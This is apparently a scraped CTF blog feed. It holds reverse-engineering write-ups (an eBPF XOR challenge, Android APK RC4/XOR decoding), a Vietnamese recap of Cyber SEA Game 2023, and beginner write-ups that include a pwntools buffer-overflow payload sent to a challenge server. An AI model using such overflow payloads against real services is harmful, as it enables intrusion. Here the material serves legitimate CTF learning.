the kernel.\nIn this chall, we must use process EBPF from https://github.com/zandi/eBPF_processor to dissasemble this file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 detect_execve: mov r1, 0x1C050444 stxw [r10-8], r1 lddw r1, 0x954094701340819 stxdw [r10-0x10], r1 lddw r1, 0x10523251403E5713 stxdw [r10-0x18], r1 lddw r1, 0x43075A150E130D0B stxdw [r10-0x20], r1 mov r1, 0 LBB0_1: lddw r2, 0 add r2, r1 ldxb r2, [r2] mov r3, r10 add r3, -0x20 add r3, r1 ldxb r4, [r3] xor r2, r4 stxb [r3], r2 add r1, 1 jeq r1, 0x1C, LBB0_2 ja LBB0_1 -------------------------------------- LBB0_2: mov r3, r10 add r3, -0x20 lddw r1, 0x1C mov r2, 4 call 6 mov r0, 1 ret -------------------------------------- szmarinkitagawa:db \u0026#34;marinkitagawamarinkitagawama\u0026#34;,0 This is simple assembly code, so I have the script to get the flag, notice that the key is marinkitagawamarinkitagawama:\n1 2 3 4 5 6 7 8 9 10 11 key = \u0026#34;marinkitagawamarinkitagawama\u0026#34; data = [ 0x1C050444, 0x954094701340819, 0x10523251403E5713, 0x43075A150E130D0B ] rote = [((value \u0026gt;\u0026gt; i) \u0026amp; 0xFF) for value in reversed(data) for i in range(0, 64, 8)] flag = \u0026#39;\u0026#39;.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(rote)) print(flag) # flag{1n7r0_70_3bpf_h3h3h3eh}mari or we can guess easily xor with length of key and data xD\nSl4ydroid Attachment: sl4ydroid.apk like the Open Sesame challenge, we will use Decompiler.com to decompile this apk\nIn this challenge, during the ctf, I only completed 3/4 of flag, which is quite unfortunate\nI use jadx to decompile this apk and export lib because nothing java usefull in source :\u0026laquo;\nWhen i load libsl4ydroid.so to IDA, the first function i see RC4 hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 int __stdcall firsts(int a1) { unsigned int v1; // eax unsigned int v2; // eax int v4; // [esp+10h] [ebp-58h] int v5; // [esp+18h] [ebp-50h] char v6; // [esp+1Fh] [ebp-49h] unsigned int i; // [esp+30h] [ebp-38h] char v8[16]; // [esp+40h] [ebp-28h] BYREF char v9[16]; // [esp+50h] [ebp-18h] BYREF unsigned int v10; // [esp+60h] [ebp-8h] v10 = __readgsdword(0x14u); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(a1, \u0026#34;b5)c]d/ZP1:\\\u0026#34;\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v9, \u0026#34;R00rkee\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v8, \u0026#34;R1zz\u0026#34;); for ( i = 0; i \u0026lt;= sub_1AC20(a1) - 1; ++i ) { v4 = *sub_1AC50(a1, i); v1 = sub_1AC20(v9); v5 = *sub_1AC50(v9, i % v1) ^ v4; v2 = sub_1AC20(v8); v6 = *sub_1AC50(v8, i % v2) ^ v5; *sub_1AC50(a1, i) = v6; } std::string::~string(v8); std::string::~string(v9); return a1; } when i convert it to python and run, i receive b4ckd00r2023, so it will be RC4\n1. Java_com_backdoor_sl4ydroid_MainActivity_kim\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_kim(_JNIEnv *a1, int a2, int a3) { _BYTE *v3; // eax const char *v4; // eax int v6; // [esp+34h] [ebp-64h] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v9; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v11[8]; // [esp+58h] [ebp-40h] BYREF char v12[8]; // [esp+60h] [ebp-38h] BYREF char v13[16]; // [esp+68h] [ebp-30h] BYREF char v14[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v15; // [esp+88h] [ebp-10h] v15 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v14, \u0026amp;s1, \u0026amp;us3_m3); v9 = sub_1BCB0(v14); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v9, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v13, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); sub_1B850(v12); sub_1B8A0(v11); while ( (sub_1B910(v12, v11) \u0026amp; 1) != 0 ) { v3 = sub_1B950(v12); *v3 += 8; *v3 ^= 7u; sub_1B960(v12); } v4 = sub_1BCB0(v13); v6 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v6); _JNIEnv::DeleteLocalRef(a1, v6); std::string::~string(v13); std::string::~string(v14); return __readgsdword(0x14u); } Here is simple encrypt with +8 and ^7 so i use script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def encrypt_string(input_str, key): result = bytearray() for i in range(len(key)): encrypted_char = (ord(key[i]) + 8) ^ 7 result += encrypted_char.to_bytes(1, byteorder=\u0026#34;little\u0026#34;) return result k1 = \u0026#34;Yc^XtMfu\u0026#34; m1 = \u0026#34;d23ba52679c5e1\u0026#34; encrypted_result = encrypt_string(m1, k1) print(\u0026#34;Encrypted Result:\u0026#34;, encrypted_result.hex()) # 666c61677b52697a --\u0026gt; flag{Riz 2. Java_com_backdoor_sl4ydroid_MainActivity_damn\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_damn(_JNIEnv *a1, int a2, int a3) { int v3; // eax const char *v4; // eax char v6; // [esp+27h] [ebp-71h] int v7; // [esp+38h] [ebp-60h] int i; // [esp+3Ch] [ebp-5Ch] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v11; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v13[16]; // [esp+58h] [ebp-40h] BYREF char v14[16]; // [esp+68h] [ebp-30h] BYREF char v15[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v16; // [esp+88h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r1, \u0026amp;us3_m3); v11 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v11, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); std::string::basic_string(v13, v14); for ( i = sub_1AC20(v13) - 1; i \u0026gt;= 0; --i ) { v6 = *sub_1AC50(v13, i) ^ 0xC; v3 = sub_1AC20(v14); *sub_1AC50(v14, v3 - 1 - i) = v6; } v4 = sub_1BCB0(v14); v7 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v7); _JNIEnv::DeleteLocalRef(a1, v7); std::string::~string(v13); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here is simple xor with 0xC and reverse strings\n1 2 3 4 5 6 7 8 9 10 11 12 def damn(k3): v14 = k3 for i in range(len(k3)-1, -1, -1): v6 = ord(k3[i]) ^ 0xC v14 = v14[:len(k3)-1-i] + chr(v6) + v14[len(k3)-1-i+1:] return v14 k3 = \u0026#34;~?z?^S8o\u0026#34; result = damn(k3) print(result) # c4_R3v3r 3. Java_com_backdoor_sl4ydroid_MainActivity_k2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_k2(_JNIEnv *a1, int a2, int a3) { unsigned int v3; // eax const char *v4; // eax char v6; // [esp+1Ch] [ebp-6Ch] char v7; // [esp+23h] [ebp-65h] int v8; // [esp+38h] [ebp-50h] unsigned int i; // [esp+3Ch] [ebp-4Ch] int StringUTFChars; // [esp+40h] [ebp-48h] int MethodID; // [esp+4Ch] [ebp-3Ch] int v12; // [esp+50h] [ebp-38h] int ObjectClass; // [esp+54h] [ebp-34h] char v14[16]; // [esp+58h] [ebp-30h] BYREF char v15[16]; // [esp+68h] [ebp-20h] BYREF unsigned int v16; // [esp+78h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r2, \u0026amp;us3_m3); v12 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v12, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); for ( i = 0; i \u0026lt;= sub_1AC20(v14) - 1; ++i ) { v6 = *sub_1AC50(v14, i); v3 = sub_1AC20(\u0026amp;v2); v7 = *sub_1AC50(\u0026amp;v2, i % v3) ^ v6; *sub_1AC50(v14, i) = v7; } v4 = sub_1BCB0(v14); v8 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v8); _JNIEnv::DeleteLocalRef(a1, v8); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here use RC4 with %v2 corresponds to m2\n1 2 3 4 5 6 7 8 9 10 11 k4 = \u0026#34;xP78V`m?3XeL\u0026#34; r = b\u0026#34;\u0026#34; m2 = \u0026#34;May_1??\u0026#34; for i in range(len(k4)): ra = ord(m2[i % len(m2)]) ^ ord(k4[i]) r += ra.to_bytes(2, byteorder=\u0026#34;little\u0026#34;) print(r.replace(b\u0026#34;\\x00\u0026#34;,b\u0026#34;\u0026#34;)) # b\u0026#39;51Ngg_RrR!:}\u0026#39; I receive flag{Riz....c4_R3v3r51Ngg_RrR!:} and stuck with ring function in Java_com_backdoor_sl4ydroid_MainActivity_nim.\nWe can use gdb to debug this function \u0026amp; get script\n1 2 3 4 5 6 7 8 9 x = \u0026#34;yeahh\u0026#34; k2 = \u0026#34;0,S[)\u0026#34; flag2 = \u0026#34;\u0026#34; for i in range(len(k2)): flag2+= chr(ord(x[i]) ^ (ord(k2[i]) ^ 0x13)) print(flag2) # ZZ! R flag: flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}\nIt\u0026rsquo;s a pity because this challenge is\u0026rsquo;t hard hix :((. We can use log in Android Studio to check flag easily xDDD (From Vietzett)\n","date":"2023-12-18T00:00:00Z","image":"/p/backdoor-ctf-2023-reverse-engineering/featured_hu1633d773772b68a8a46d663a367faa24_195597_120x120_fill_box_smart1_3.png","permalink":"/p/backdoor-ctf-2023-reverse-engineering/","title":"Backdoor CTF 2023 | Reverse Engineering"},{"content":"Post n√†y ch·ªâ ƒë·ªÉ k·ªÉ c√¢u chuy·ªán ƒë·ªôi m√¨nh ƒëi thi Cyber SEA Game 2023 t·∫°i Bangkok, Thailand (9-10/11/2023)\nCyber SEA Game 2023 (Bangkok - Thailand) T·ªïng quan v·ªÅ cu·ªôc thi c·ªßa ƒë·ªôi Vi·ªát Nam Trong 5 ph√∫t ƒë·∫ßu ti√™n, khi team Vi·ªát Nam nh·∫≠n server v√† t√†i kho·∫£n c≈©ng nh∆∞ th·ª±c hi·ªán c√°c thao t√°c v·ªÅ ƒë·ªïi m·∫≠t kh·∫©u v√† ki·ªÉm tra, ch√∫ng t√¥i ng·∫°c nhi√™n khi th·∫•y c√≥ t·ªõi 6 team kh√°c ƒë√£ l·∫ßn l∆∞·ª£t submit c√°c ch·ªß ƒë·ªÅ, nh∆∞ng ch∆∞a r√µ ƒëi·ªÅu g√¨ ƒë√£ x·∫£y ra.\nC√°c th√†nh vi√™n trong ƒë·ªôi t·ª± qu·∫£n l√Ω kh·ªëi l∆∞·ª£ng c√¥ng vi·ªác m·ªôt c√°ch r√µ r√†ng, m·∫∑c d√π h∆°i ti·∫øc r·∫±ng Huy v√† Th√†nh, chuy√™n s√¢u v·ªÅ Binary v√† Web Exploitation, l·∫°i kh√¥ng c√≥ ch·ªß ƒë·ªÅ n√†o li√™n quan ƒë·∫øn s·ªü tr∆∞·ªùng c·ªßa h·ªç. C·ª• th·ªÉ:\nVi·ªát Anh ƒë·∫£m nh·∫≠n Cryptography v√† Network Ho√†ng Huy ch·ªãu tr√°ch nhi·ªám cho Hacking Challenge 1 Th√°i S∆°n th·ª±c hi·ªán c√°c nhi·ªám v·ª• OSINT, Steganography, Forensic, Reversing, v√† Memory Ch√≠ Th√†nh ƒë·∫£m nhi·ªám Hacking Challenge 2. Ch√∫ng t√¥i c·∫£m th·∫•y √°p l·ª±c khi ƒë·ªôi Singapore th·ª±c hi·ªán nhanh ch√≥ng v√† ho√†n th√†nh trong th·ªùi gian ng·∫Øn. Tuy nhi√™n, RobinHust kh√¥ng n·∫£n ch√≠ v√† c·ªë g·∫Øng h·∫øt m√¨nh ƒë·ªÉ ho√†n th√†nh c√°c th√°ch th·ª©c c·ªßa m√¨nh. ƒê·∫∑c bi·ªát, c√°c th√°ch th·ª©c kh√¥ng ch·ªâ ƒë√≤i h·ªèi s·ª≠ d·ª•ng c√°c k·ªπ thu·∫≠t t·∫•n c√¥ng c∆° b·∫£n m√† c√≤n ƒë√≤i h·ªèi s·ª± s√°ng t·∫°o v√† \u0026ldquo;c·∫£m nh·∫≠n t·ª´ gi√°c quan\u0026rdquo; (hay c√≤n g·ªçi 1 c√°ch kh√°c l√† bruteforce :3):\nTrong b√†i Flag #03: Cracking a Zip File c·ªßa ch·ªß ƒë·ªÅ Cryptography, c√≥ m·ªôt y√™u c·∫ßu l√† ph·∫£i gi·∫£i m√£ m·∫≠t kh·∫©u openthesamesenovemberXXXX, v√† vi·ªác bruteforce 4 k√Ω t·ª± cu·ªëi c√≥ th·ªÉ m·∫•t m·ªôt kho·∫£ng th·ªùi gian (theo l·ªùi gi·∫£i ch√≠nh th·ª©c ƒë·∫øn t·ª´ BTC). Tuy nhi√™n, th√¥ng qua kh·∫£ nƒÉng suy lu·∫≠n, ch√∫ng t√¥i ƒë√£ th·ª≠ nghi·ªám th√†nh c√¥ng v·ªõi 4 k√Ω t·ª± cu·ªëi l√† 2023, gi√∫p qu√° tr√¨nh tr·ªü n√™n nhanh ch√≥ng v√† d·ªÖ d√†ng\nHo√†ng Huy t·∫•n c√¥ng th√†nh c√¥ng Hacking Challenge 1, li√™n t·ª•c v∆∞·ª£t qua c√°c th√°ch th·ª©c. Team Vi·ªát Nam ƒë√£ th·ªÉ hi·ªán kh·∫£ nƒÉng xu·∫•t s·∫Øc trong vi·ªác gi·∫£i quy·∫øt th·ª≠ th√°ch n√†y nh·ªù ƒë·ªçc k·ªπ t√†i li·ªáu t·ª´ BTC v√† th·ª≠ nghi·ªám tr∆∞·ªõc.\nTh√°i S∆°n ƒë√£ x·ª≠ l√Ω th√†nh c√¥ng c√°c th·ª≠ th√°ch v·ªÅ Steganography, Memory, Reversing v√† m·ªü c√°c th·ª≠ th√°ch Forensic.\nTh√†nh ƒë√£ chuy·ªÉn sang h·ªó tr·ª£ S∆°n v√† Vi·ªát Anh trong c√°c th·ª≠ th√°ch Forensic v√† Crypto, sau ƒë√≥ quay tr·ªü l·∫°i c√πng Ho√†ng Huy ƒë·ªÉ gi·∫£i quy·∫øt Hacking Challenge 2.\nM·ªçi th·ª© di·ªÖn ra m∆∞·ª£t m√† v√† su√¥n s·∫ª, ƒë·ªôi ƒë√£ ho√†n th√†nh to√†n b·ªô c√°c th√°ch th·ª©c trong v√≤ng 3 ti·∫øng 30 ph√∫t.\nTrong cu·ªôc thi, h·∫ßu h·∫øt c√°c ƒë·ªôi ƒë·ªÅu c√≥ t·ªâ l·ªá submit sai kh√° l·ªõn c√πng 1 l∆∞·ª£ng th·ªùi gian l√£ng ph√≠ qu√° nhi·ªÅu v√¨ ph·∫£i ƒëo√°n trong th·ª≠ th√°ch Flag #03 Initial execution c·ªßa ch·ªß ƒë·ªÅ ƒëi·ªÅu tra s·ªë Forensic ƒë∆∞a ra 1 danh s√°ch kh√° nhi·ªÅu nh·ªØng flag gi·∫£ m√† ch√∫ng t√¥i ph·∫£i th·ª≠ ƒë·ªÉ gi·∫£i quy·∫øt\nPhase 1: kh·ªüi ƒë·∫ßu c·ªßa cu·ªôc thi (Kho·∫£ng 1 ti·∫øng t·ª´ sau khi cu·ªôc thi b·∫Øt ƒë·∫ßu) ƒê·ªôi c·ªßa ch√∫ng t√¥i kh·ªüi ƒë·∫ßu kh√¥ng m·∫•y thu·∫≠n l·ª£i khi tr·ªü th√†nh ƒë·ªôi ch·∫≠m nh·∫•t trong s·ªë 10 ƒë·ªôi gi·∫£i quy·∫øt th·ª≠ th√°ch ƒë·∫ßu ti√™n.\nC√°c ƒë·ªôi kh√°c b·∫Øt ƒë·∫ßu submit t·ª´ng th·ª≠ th√°ch t·ª´ 12:00 v√† ƒë·∫øn t·∫≠n 12:22 team Vi·ªát Nam m·ªõi submit ƒë∆∞·ª£c challenge ƒë·∫ßu c·ªßa Vi·ªát Anh (Th·∫≠t s·ª± kh√¢m ph·ª•c c√°c th√†nh vi√™n trong ƒë·ªôi v√¨ gi·ªØ ƒë∆∞·ª£c s·ª± b√¨nh tƒ©nh ƒë·∫øn kh√¥ng ng·ªù)\nSau ƒë√≥ c√°c th√†nh vi√™n l·∫ßn l∆∞·ª£t submit c√°c b√†i ƒë·∫ßu ti√™n c·ªßa t·ª´ng ch·ªß ƒë·ªÅ (t·ªõi l√∫c n√†y v·∫´n gi·ªØ v·ªã tr√≠ cu·ªëi b·∫£ng do c√°c ƒë·ªôi kh√°c ƒë√£ submit r·∫•t nhi·ªÅu c√°c th·ª≠ th√°ch kh√°c t·ª´ tr∆∞·ªõc ƒë√≥ m·ªôt l√∫c)\nPhase 2: mid game (Kho·∫£ng 2 ti·∫øng t·ª´ sau khi cu·ªôc thi b·∫Øt ƒë·∫ßu) Sau khi b·ªã m·∫Øc k·∫πt ·ªü nh·ªØng th·ª≠ th√°ch ban ƒë·∫ßu, ƒë·ªôi c·ªßa ch√∫ng t√¥i ƒë√£ kh√¥i ph·ª•c ƒë∆∞·ª£c phong ƒë·ªô v√† th√†nh c√¥ng trong vi·ªác gi·∫£i quy·∫øt c√°c th√°ch th·ª©c ti·∫øp theo m·ªôt c√°ch nhanh ch√≥ng.\nB·ª©t t·ªëc l·∫ßn 1: sau kho·∫£ng 30 ph√∫t k·ªÉ t·ª´ khi gi·∫£i ƒë∆∞·ª£c challenge ƒë·∫ßu ti√™n, team ƒë√£ b·ª©t t·ªëc t·ª´ v·ªã tr√≠ cu·ªëi b·∫£ng l√™n v·ªã tr√≠ 6, b·ªã d·∫´n tr∆∞·ªõc b·ªüi c√°c team Singapore, Malaysia, Th√°i, Brunei v√† Myanmar\nSau h∆°n m·ªôt gi·ªù di·ªÖn ra cu·ªôc thi, ƒë·ªôi Singapore ƒë√£ g√¢y ·∫•n t∆∞·ª£ng khi ho√†n th√†nh t·∫•t c·∫£ c√°c th·ª≠ th√°ch, k√®m theo vi·ªác l·∫Øc chu√¥ng m·ªói khi \u0026ldquo;clear\u0026rdquo; m·ªôt ch·ªß ƒë·ªÅ n√†o ƒë√≥. L√∫c n√†y, t√¢m l√Ω c·ªßa ƒë·ªôi ch√∫ng t√¥i c√≥ ch√∫t \u0026ldquo;s·ªëc\u0026rdquo;, nh∆∞ng ƒë√£ nhanh ch√≥ng ·ªïn ƒë·ªãnh tinh th·∫ßn v√† ti·∫øp t·ª•c v∆∞·ª£t qua m·ªçi th√°ch th·ª©c.\nB·ª©t t·ªëc l·∫ßn 2: Kho·∫£ng 1 gi·ªù 45 ph√∫t ƒë·∫øn 2 gi·ªù sau khi cu·ªôc thi b·∫Øt ƒë·∫ßu, ƒë·ªôi c·ªßa ch√∫ng t√¥i li√™n t·ª•c gi·∫£i quy·∫øt c√°c th·ª≠ th√°ch v·ªÅ Crypto, Hacking Challenge 1 v√† Forensic. Vi·ªác n√†y gi√∫p ƒë·ªôi ch√∫ng t√¥i v∆∞·ª£t qua ƒë·ªôi Th√°i Lan, ƒë·ªìng th·ªùi chi·∫øm top 3 tr√™n B·∫£ng x·∫øp h·∫°ng, ch·ªâ ƒë·ª©ng sau ƒë·ªôi Singapore v√† Malaysia.\nPhase 3: End game B·ª©t t·ªëc l·∫ßn 3: Sau m·ªôt th·ªùi gian d√†i b·∫ø t·∫Øc ·ªü c√°c th√°ch th·ª©c Forensic v√† Hacking Challenge 2 b·ªüi ƒë·ªô guessing c·ªßa ch√∫ng, b·∫±ng thi√™n ph√∫ \u0026ldquo;bruteforce\u0026rdquo; c·ªßa c√°c th√†nh vi√™n, ƒë·ªôi c·ªßa ch√∫ng t√¥i cu·ªëi c√πng c≈©ng v∆∞·ª£t qua kh√≥ khƒÉn, gi·∫£i quy·∫øt m·ªôt l∆∞·ª£t to√†n b·ªô c√°c th·ª≠ th√°ch Forensic (t·ªõi l√∫c n√†y Th√°i S∆°n g·∫ßn nh∆∞ ƒë√£ thu·ªôc to√†n b·ªô source c·ªßa 7 th·ª≠ th√°ch Forensic v√¨ lu·∫©n qu·∫©n ·ªü ƒë√¢y qu√° l√¢u ü§£)\nCh·ªët h·∫° Cyber SEA Game 2023 v·ªõi Vi·ªát Nam l√† th·ª≠ th√°ch cu·ªëi c·ªßa Hacking Challenge 2 b·∫±ng c√∫ submit c·ªßa Ho√†ng Huy. ƒêi·ªÅu n√†y gi√∫p ch√∫ng t√¥i v∆∞·ª£t qua ƒë·ªôi Malaysia, tr·ªü th√†nh ƒë·ªôi th·ª© hai gi·∫£i to√†n b·ªô c√°c th·ª≠ th√°ch, sau g·∫ßn 4 ti·∫øng ƒë·ªìng h·ªì.\nP/s: Sau ƒë√≥ kho·∫£ng 1 ti·∫øng th√¨ ƒë·ªôi th·ª© 3 l√† Team Thailand c≈©ng ho√†n th√†nh to√†n b·ªô th·ª≠ th√°ch v√† BTC ƒë√£ c√≥ th·ªÉ ƒë·ªãnh ra 3 ƒë·ªôi trao Nh·∫•t, Nh√¨, Ba c·ªßa to√†n gi·∫£i Cyber SEA Game.\nB·∫£ng x·∫øp h·∫°ng Trao Gi·∫£i Tuy c√≥ ch√∫t ti·∫øc nu·ªëi v·ªÅ vi·ªác kh√¥ng ƒë·∫°t ƒë∆∞·ª£c chi·∫øc c√∫p v√¥ ƒë·ªãch c·ªßa Cyber SEA Game nh∆∞ng Nu_RobinHust c≈©ng r√∫t ra ƒë∆∞·ª£c b√†i h·ªçc r·∫•t l·ªõn v·ªÅ vi·ªác chu·∫©n b·ªã k·ªπ c√†ng m·ªçi th·ª© tr∆∞·ªõc khi tham gia 1 cu·ªôc thi c≈©ng nh∆∞ s·ª± b√¨nh tƒ©nh khi g·∫∑p c√°c kh√≥ khƒÉn ƒë·ªôt ng·ªôt.\nƒê√¢y s·∫Ω l√† b∆∞·ªõc ti·∫øn r·∫•t l·ªõn cho team c≈©ng nh∆∞ ƒê·∫°i h·ªçc B√°ch khoa H√† N·ªôi, ch√∫ng m√¨nh c≈©ng s·∫Ω l·∫•y ƒë√≥ l√†m kinh nghi·ªám v√† ƒë·ªông l·ª±c ƒë·ªÉ ph√°t tri·ªÉn b·∫£n th√¢n m√¨nh trong t∆∞∆°ng lai.\n","date":"2023-11-10T00:00:00Z","image":"/p/cyber-sea-game-2023-recap/featured_hu59a906ccfb75fefec7be147e7f623c55_262995_120x120_fill_box_smart1_3.png","permalink":"/p/cyber-sea-game-2023-recap/","title":"Cyber SEA Game 2023 | Recap"},{"content":"Here is writeups for some challs that i solved in this competition!\nCurrency Converter | REV attachment: converter.jar\nNeed to convert USD to another currency? Well I hope its either Euros, Canadian, or Yen!\nReceive attachment include 1 jar file, so use Decompiler - Jar String Editor decompile jar to java\nIn the CurrencyConverter.java we get the flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class CurrencyConverter { public static String convert_euro(double var0) { double var2 = var0 * 0.92D; return \u0026#34;Euro: \u0026#34; + var2; } public static String convert_canada(double var0) { double var2 = var0 * 1.36D; return \u0026#34;Canadian: \u0026#34; + var2; } public static String convert_yen(double var0) { double var2 = var0 * 145.14D; return \u0026#34;Japanese Yen: \u0026#34; + var2; } private static String flag() { return \u0026#34;bctf{o0ps_y0u_fOuNd_mE}\u0026#34;; } } 8ball | REV Attachment: dist.zip\nLet me guide you to the flag.\nWhen extract file, i receive an elf file (8ball)\nthen load it into IDA, and follow the main part\nand function print_flag() (but we can skip it bcuz it seem difficult)\nIn main, we have: if ( argc != 2 ), !strcmp(*argv, \u0026quot;./magic8ball\u0026quot;) and if ( v8 \u0026amp;\u0026amp; strstr(argv[1], \u0026quot;flag\u0026quot;) ) so i think i must rename the file (8ball to magic8ball) and argument is flag\nBeginner Menu | PWN attachment: beginner-menu.c\nI just made this menu for my coding class. I think I covered all the switch cases.\nnetcat: nc chall.pwnoh.io 13371\nIn this chall, we can see the game with guess number (each netcat connection)\nbut if we guess the correct number, the netcat will disconnect :((\n1 2 3 4 5 6 7 8 9 10 11 12 13 else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); // exit when guess the correct number } print_flag() will be called if pass all if-else\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 if(strcmp(buf, \u0026#34;0\\n\u0026#34;)==0){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } if(atoi(buf) ==1){ printf(joke[(rand()%5)]); exit(0); } else if(atoi(buf) == 2){ printf(weather[(rand()%5)]); exit(0); } else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); } else if(atoi(buf)==4){ exit(0); } else if(atoi(buf)\u0026gt;4){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } print_flag(); but i found vuln :\u0026gt;\nso we can press Enter into the select option of netcat to get flag\nStarter Buffer | PWN attachment: start-buffer.c\nTell me your favorite number and I might give you the flag ;).\nnetcat: nc chall.pwnoh.io 13372\nI see the buffer overflow vulnerability here\nso we can use pwntool to send byte 0x45454545 through netcat and string buffer and get the flag (The current value of the flag is 0xaabbccdd, so we must input 60 * \u0026quot;A\u0026quot; + byte 0x45454545 so that the value after input of the flag becomes 0x45454545)\n1 2 3 4 5 6 7 8 from pwn import * p = remote(\u0026#34;chall.pwnoh.io\u0026#34;, 13372) exploit_payload = b\u0026#34;A\u0026#34; * 60 + p32(0x45454545) p.sendline(exploit_payload) response = p.recvall() print(response) Needle in the Wifi Stack | MISC attachment: frames.pcap\nThis chall has a .pcap file, as usual, i\u0026rsquo;ll strings + grep first and it has many base64 strings\nso i think we can find with the format of flag: btcf{ encode to base64: YmN0Zn\nConvert YmN0Znt0dzBfcG8xbnRfNF9nMzNfYzBuZzNzN2kwbn0K0 to base64\nParkour | MISC (ftpotato) Completely unrelated to CTF Minecraft parkour.\nserver: chall.pwnoh.io:13389\nThis challenge is a minecraft parkour server created by the author in version 1.20.1\nAfter many unsuccessful attempts to jump on the blocks, i decided to cheat :333 and i use Wurst Client\nAfter cheating with the Wurst Client, you can fly to the flag in the sky and get it\nMy First Hash | CRYPTO Here\u0026rsquo;s your flag: 8f163b472e2164f66a5cd751098783f9 Psyc! Its encrypted. You think I\u0026rsquo;d give it to you that easily? Definitely don\u0026rsquo;t look at my code tho -\u0026gt;\u0026lt;- (when you find the flag, put it in bctf{} format)\nattachment: my-first-hash.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import hashlib from sys import exit flag = \u0026#39;8f163b472e2164f66a5cd751098783f9\u0026#39; str = input(\u0026#34;Enter the flag\\n\u0026#34;) str = hashlib.md5(str.encode()) if str.digest().hex() == flag: print(\u0026#34;Congrats! You got the flag!\u0026#34;) else: print(\u0026#34;Nope. Try again!\u0026#34;) exit() it seems like an easy md5 reverse, use MD5 Center to reverse this MD5 hash, we get orchestra \u0026ndash;\u0026gt; bctf{orchestra}\nRivest-Shamir-Adleman | CRYPTO Big numbers make big security\nattachment: dist.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 message = b\u0026#34;[REDACTED]\u0026#34; m = int.from_bytes(message, \u0026#34;big\u0026#34;) p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 n = p * q et = (p - 1) * (q - 1) d = pow(e, -1, et) c = pow(m, e, n) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;c = 